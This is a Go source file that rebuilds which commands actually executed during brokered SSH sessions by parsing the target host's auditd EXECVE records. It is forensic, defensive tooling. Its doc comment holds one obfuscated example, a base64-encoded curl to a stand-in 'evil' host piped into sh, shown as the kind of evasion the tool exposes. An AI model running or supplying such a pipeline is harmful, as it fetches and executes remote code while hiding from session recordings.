// Package sessionforensics reconstructs what actually EXECUTED during a
// brokered interactive session, from the target's own kernel audit records
// (Phase 157). It is pure parsing and formatting — no I/O, no store, no vault —
// so it can be tested against fixed sample text the way internal/accountscan is.
//
// # The gap this closes, and why it is not eBPF
//
// PAMv1 records every byte of an interactive SSH session (asciicast v2), but
// `internal/cmdguard`'s own doc comment states the boundary: an interactive PTY
// is never parsed. A recording therefore shows what was TYPED, which is not the
// same as what RAN. `echo Y3VybCAtcyBodHRwOi8vZXZpbA== | base64 -d | sh`
// records one innocuous-looking line; `stty -echo` records nothing at all.
// Teleport closes this with eBPF: its SSH service runs ON the node, so the
// session's processes are its own children and a kernel probe sees every
// execve.
//
// **PAMv1 cannot do that, and the reason is architectural rather than a missing
// dependency.** PAMv1 is a proxy: an operator's shell runs on the TARGET, under
// the target's sshd, in the target's kernel. Nothing an operator types is ever
// executed on the pam-server host — there is no `os/exec` anywhere in the
// session path — so an eBPF exec tracer attached on pam-server would observe
// exactly zero events for every brokered session. Kernel-level in-session
// tracing needs code inside the target's kernel; the only PAMv1 code that ever
// runs on a target is the Phase 153 endpoint agent, on opt-in endpoints only,
// and even there it would need system-wide tracing plus a socket → sshd-child →
// process-tree correlation, and a reporting path from agent to server that
// Phase 153 deliberately refused to open. That is a documented, permanent
// limitation of brokering rather than a gap a bigger CI runner closes — see
// ROADMAP.md's Phase 157 entry and docs/EXTERNAL-INFRA-GAPS.md.
//
// # What this does instead
//
// The target's kernel already keeps the record: the Linux audit subsystem (the
// same syscall hooks an eBPF probe would tap) writes an EXECVE record for every
// exec, with the argv as executed — decoded, after any shell expansion or
// base64 pipeline. So when a session ends, PAMv1 runs ONE fixed, read-only
// command over that target's own vaulted credential, on a FRESH connection
// (never the live session — the same shape Phase 128's account discovery
// established), filters the records to the session's own window, and attaches
// the result to the session as a hash-chained forensic artifact.
//
// It is audit-only and makes no containment claim: it reports after the fact,
// it depends on the target running auditd with exec auditing enabled, and a
// root operator on the target can tamper with the target's own logs (as they
// could unload an eBPF probe). What it defeats is the evasion this project
// actually documented as open: obfuscated and unechoed commands leaving no
// structured record of what ran.
package sessionforensics

import (
	"encoding/hex"
	"fmt"
	"sort"
	"strconv"
	"strings"
	"time"
)

// Command is the single fixed, read-only command PAMv1 runs on the target after
// a session ends. It is deliberately not configurable: a remote command string
// an operator could set is a policy hole, and this one runs with a privileged
// vaulted credential (Phase 128 settled the same question the same way).
//
//   - `ausearch` is auditd's supported reader; it follows log rotation, which
//     reading /var/log/audit/audit.log by hand would not.
//   - `-ts today` rather than an exact window: ausearch's `-ts` takes a
//     locale-formatted date, and building one on the target's locale is exactly
//     the kind of brittleness that makes a forensic tool lie. The window is
//     applied HERE instead, against each record's own epoch timestamp, which is
//     unambiguous.
//   - `tail -c` bounds what a chatty target can return; a truncated leading
//     record is skipped by the parser and reported as truncation rather than
//     silently dropped.
//   - stderr is deliberately NOT redirected away: the connector merges it, and
//     the target's own "Permission denied" or "command not found" is precisely
//     what turns an empty result into an honest UNAVAILABLE note instead of a
//     silent "nothing ran". There is no output redirection in this command at
//     all — it only ever reads.
const Command = "ausearch -m EXECVE -ts today | tail -c 1048576"

// maxArgvBytes bounds one reconstructed command line. Audit records can carry a
// megabyte-long argv; a forensic artifact is read by humans and stored beside a
// recording, so an individual line is truncated (visibly, with an ellipsis)
// rather than allowed to dominate the file.
const maxArgvBytes = 4096

// Event is one execve the target's kernel recorded.
type Event struct {
	// Time is the record's own timestamp (audit epoch), in UTC.
	Time time.Time `json:"time"`
	// Serial is the audit event serial — the join key between the SYSCALL and
	// EXECVE halves of one event, kept so an artifact can be traced back to the
	// target's own log.
	Serial string `json:"serial"`
	PID    int    `json:"pid"`
	PPID   int    `json:"ppid"`
	// AUID is the *login* uid: the identity that opened the session, which
	// survives su/sudo — the field that ties an exec back to a person on a
	// shared account. UID is the effective one at exec time.
	AUID string `json:"auid"`
	UID  string `json:"uid"`
	// Exe is the binary the kernel actually executed.
	Exe string `json:"exe"`
	// Argv is the command line AS EXECUTED — already decoded, which is the
	// whole point: an obfuscated pipeline records its decoded execve here.
	Argv []string `json:"argv"`
	// Success is the kernel's own success flag for the syscall.
	Success bool `json:"success"`
	// Key is the audit rule key that matched, when the target tags its rules.
	Key string `json:"key,omitempty"`
}

// CommandLine renders Argv the way a human reads a command, bounded.
func (e Event) CommandLine() string {
	line := strings.Join(e.Argv, " ")
	if len(line) > maxArgvBytes {
		line = line[:maxArgvBytes] + "…"
	}
	return line
}

// Report is what one session's reconstruction produced.
type Report struct {
	// Source names where the records came from, so a reader of the artifact is
	// never guessing which mechanism produced it.
	Source string `json:"source"`
	// Target, Actor, SessionID and the window identify the session this
	// reconstructs; they are PAMv1's own facts, not the target's.
	Target    string    `json:"target"`
	Actor     string    `json:"actor"`
	SessionID string    `json:"session_id,omitempty"`
	Started   time.Time `json:"started"`
	Ended     time.Time `json:"ended"`
	// Recording names the session recording this artifact belongs beside.
	Recording string `json:"recording,omitempty"`
	// Events are the execs inside the window, oldest first.
	Events []Event `json:"events"`
	// Available is false when the target could not produce records at all (no
	// auditd, no permission). Note carries the reason — an honest "we do not
	// know" rather than an empty list that reads as "nothing ran".
	Available bool   `json:"available"`
	Note      string `json:"note,omitempty"`
	// Truncated reports that the target's output hit the byte cap, or that the
	// event cap dropped records: a partial forensic record must say so.
	Truncated bool `json:"truncated,omitempty"`
	// Scanned is how many EXECVE events were parsed before window filtering.
	Scanned int `json:"scanned"`
}

// Unavailable builds the honest empty report: the difference between "nothing
// ran" and "the target could not tell us" is the whole value of the field.
func Unavailable(note string) Report {
	return Report{Source: "auditd(ausearch)", Available: false, Note: note, Events: []Event{}}
}

// Parse turns raw `ausearch -m EXECVE` output into the events inside
// [start, end], oldest first, capped at maxEvents (0 = uncapped).
//
// Records outside the window are dropped rather than reported: this artifact
// belongs to ONE session, and a target's audit log holds every session's execs
// (including other operators'). Bleeding another session's commands into this
// one's forensic record would be worse than reporting nothing.
func Parse(raw string, start, end time.Time, maxEvents int) Report {
	rep := Report{Source: "auditd(ausearch)", Available: true, Started: start.UTC(), Ended: end.UTC(), Events: []Event{}}
	if strings.TrimSpace(raw) == "" {
		return Unavailable("the target returned no audit records: auditd may not be running, exec auditing may not be enabled, or the vaulted credential may not be permitted to read the audit log")
	}
	// ausearch separates events with a line of dashes. A `tail -c` cut leaves a
	// partial first block; parseBlock simply fails to find its fields and it is
	// skipped, which is why truncation is reported rather than assumed harmless.
	for _, block := range strings.Split(raw, "----") {
		ev, ok := parseBlock(block)
		if !ok {
			continue
		}
		rep.Scanned++
		// Inclusive window with a second of slack at each end: the audit clock is
		// the target's and PAMv1's is its own, and an exec at the very edge of a
		// session is exactly the one an investigator wants.
		if ev.Time.Before(start.Add(-time.Second)) || ev.Time.After(end.Add(time.Second)) {
			continue
		}
		rep.Events = append(rep.Events, ev)
	}
	sort.SliceStable(rep.Events, func(i, j int) bool { return rep.Events[i].Time.Before(rep.Events[j].Time) })
	if maxEvents > 0 && len(rep.Events) > maxEvents {
		rep.Events = rep.Events[:maxEvents]
		rep.Truncated = true
	}
	if rep.Scanned == 0 {
		return Unavailable("the target returned output but no parsable EXECVE records: " + firstLine(raw))
	}
	return rep
}

// firstLine returns a bounded first line, for an honest note about output that
// did not parse (typically an error message from the target).
func firstLine(s string) string {
	line := strings.TrimSpace(s)
	if i := strings.IndexAny(line, "\r\n"); i >= 0 {
		line = line[:i]
	}
	if len(line) > 200 {
		line = line[:200] + "…"
	}
	return line
}

// parseBlock parses one ausearch event block: its SYSCALL record carries the
// identity and process fields, its EXECVE record the argv. Both halves are
// required — an EXECVE with no SYSCALL has no pid/auid to attribute, and a
// SYSCALL with no EXECVE has no command to report.
func parseBlock(block string) (Event, bool) {
	var (
		ev       Event
		haveSys  bool
		haveExec bool
	)
	for _, line := range strings.Split(block, "\n") {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "type=SYSCALL"):
			fields := auditFields(line)
			ev.Time, ev.Serial = auditStamp(line)
			ev.PID = atoi(fields["pid"])
			ev.PPID = atoi(fields["ppid"])
			ev.AUID = fields["auid"]
			ev.UID = fields["uid"]
			ev.Exe = unquote(fields["exe"])
			ev.Key = strings.Trim(unquote(fields["key"]), `"`)
			if ev.Key == "(null)" {
				ev.Key = ""
			}
			ev.Success = fields["success"] == "yes"
			haveSys = true
		case strings.HasPrefix(line, "type=EXECVE"):
			ev.Argv = parseArgv(line)
			haveExec = len(ev.Argv) > 0
		}
	}
	if !haveSys || !haveExec || ev.Time.IsZero() {
		return Event{}, false
	}
	return ev, true
}

// auditStamp extracts the record's epoch time and serial from the
// `msg=audit(1755370800.123:456)` prefix every record carries.
func auditStamp(line string) (time.Time, string) {
	i := strings.Index(line, "audit(")
	if i < 0 {
		return time.Time{}, ""
	}
	rest := line[i+len("audit("):]
	j := strings.Index(rest, ")")
	if j < 0 {
		return time.Time{}, ""
	}
	stamp := rest[:j]
	secs, serial, ok := strings.Cut(stamp, ":")
	if !ok {
		return time.Time{}, ""
	}
	whole, frac, _ := strings.Cut(secs, ".")
	sec, err := strconv.ParseInt(whole, 10, 64)
	if err != nil {
		return time.Time{}, ""
	}
	ms, _ := strconv.ParseInt(frac, 10, 64)
	return time.Unix(sec, ms*int64(time.Millisecond)).UTC(), serial
}

// auditFields splits a record's `key=value` pairs. Quoted values may contain
// spaces, so the scan is quote-aware rather than a plain Fields split.
func auditFields(line string) map[string]string {
	out := map[string]string{}
	var key strings.Builder
	var val strings.Builder
	inKey, inQuote := true, false
	flush := func() {
		if key.Len() > 0 {
			out[key.String()] = val.String()
		}
		key.Reset()
		val.Reset()
		inKey = true
	}
	for _, r := range line {
		switch {
		case inKey && r == '=':
			inKey = false
		case inKey && r == ' ':
			key.Reset()
		case inKey:
			key.WriteRune(r)
		case r == '"':
			inQuote = !inQuote
			val.WriteRune(r)
		case r == ' ' && !inQuote:
			flush()
		default:
			val.WriteRune(r)
		}
	}
	flush()
	return out
}

// parseArgv reconstructs the argv from an EXECVE record. auditd writes each
// argument as `aN`, and encodes it three different ways depending on content:
//   - `a0="bash"` — plain, quoted;
//   - `a0=2F62696E2F7368` — HEX, whenever the argument contains a space, quote
//     or control character. Decoding this is not cosmetic: it is exactly where
//     an obfuscated command line lives, and an artifact that showed the hex
//     would hide what the tool exists to reveal;
//   - `a2_len=612 a2[0]="…" a2[1]="…"` — CHUNKED, for arguments too long for a
//     single field, which is what a base64 blob or a long one-liner produces.
//
// All three are handled; chunks are concatenated in index order.
func parseArgv(line string) []string {
	fields := auditFields(line)
	argc := atoi(fields["argc"])
	if argc <= 0 {
		return nil
	}
	// Chunked arguments arrive as aN[0], aN[1], … — collect them per index.
	chunks := map[int]map[int]string{}
	for k, v := range fields {
		open := strings.Index(k, "[")
		if open <= 0 || !strings.HasPrefix(k, "a") || !strings.HasSuffix(k, "]") {
			continue
		}
		n := atoi(k[1:open])
		idx := atoi(k[open+1 : len(k)-1])
		if chunks[n] == nil {
			chunks[n] = map[int]string{}
		}
		chunks[n][idx] = decodeArg(v)
	}
	argv := make([]string, 0, argc)
	for i := range argc {
		if parts, ok := chunks[i]; ok {
			keys := make([]int, 0, len(parts))
			for k := range parts {
				keys = append(keys, k)
			}
			sort.Ints(keys)
			var b strings.Builder
			for _, k := range keys {
				b.WriteString(parts[k])
			}
			argv = append(argv, b.String())
			continue
		}
		v, ok := fields["a"+strconv.Itoa(i)]
		if !ok {
			continue
		}
		argv = append(argv, decodeArg(v))
	}
	return argv
}

// decodeArg turns one audit argument into its literal text: quoted values lose
// their quotes, bare even-length hex is decoded, anything else is passed
// through unchanged.
func decodeArg(v string) string {
	if strings.HasPrefix(v, `"`) {
		return unquote(v)
	}
	if len(v) >= 2 && len(v)%2 == 0 && isHex(v) {
		if b, err := hex.DecodeString(v); err == nil {
			return string(b)
		}
	}
	return v
}

// isHex reports whether s is entirely hexadecimal digits.
func isHex(s string) bool {
	for _, r := range s {
		switch {
		case r >= '0' && r <= '9', r >= 'a' && r <= 'f', r >= 'A' && r <= 'F':
		default:
			return false
		}
	}
	return true
}

// unquote strips one layer of surrounding double quotes.
func unquote(v string) string {
	if len(v) >= 2 && strings.HasPrefix(v, `"`) && strings.HasSuffix(v, `"`) {
		return v[1 : len(v)-1]
	}
	return v
}

// atoi parses an integer, returning 0 for anything unparsable — audit fields are
// the target's output, so a malformed one must degrade rather than fail the
// whole reconstruction.
func atoi(s string) int {
	n, err := strconv.Atoi(strings.TrimSpace(unquote(s)))
	if err != nil {
		return 0
	}
	return n
}

// Text renders the report as the human-readable artifact stored beside the
// recording. JSON is the machine form (the artifact carries both: this text for
// the console and a reviewer, the JSON for a SIEM), and this header states
// plainly what the record is and is not, so nobody reads an empty list as proof
// that nothing ran.
func (r Report) Text() string {
	var b strings.Builder
	fmt.Fprintf(&b, "# PAMv1 session forensics (%s)\n", r.Source)
	fmt.Fprintf(&b, "# target: %s\n# actor: %s\n# session: %s\n# window: %s .. %s\n",
		r.Target, r.Actor, r.SessionID, r.Started.Format(time.RFC3339), r.Ended.Format(time.RFC3339))
	if r.Recording != "" {
		fmt.Fprintf(&b, "# recording: %s\n", r.Recording)
	}
	b.WriteString("# audit-only: reconstructed from the TARGET's own kernel audit records after the fact.\n")
	b.WriteString("# It is not a containment control, and a root operator on the target can tamper with them.\n")
	if !r.Available {
		fmt.Fprintf(&b, "\nUNAVAILABLE: %s\n", r.Note)
		return b.String()
	}
	fmt.Fprintf(&b, "# events in window: %d (of %d scanned)%s\n\n", len(r.Events), r.Scanned,
		map[bool]string{true: " — TRUNCATED", false: ""}[r.Truncated])
	for _, e := range r.Events {
		status := "ok"
		if !e.Success {
			status = "failed"
		}
		fmt.Fprintf(&b, "%s pid=%d ppid=%d auid=%s uid=%s exe=%s [%s]\n  $ %s\n",
			e.Time.Format(time.RFC3339), e.PID, e.PPID, e.AUID, e.UID, e.Exe, status, e.CommandLine())
	}
	return b.String()
}
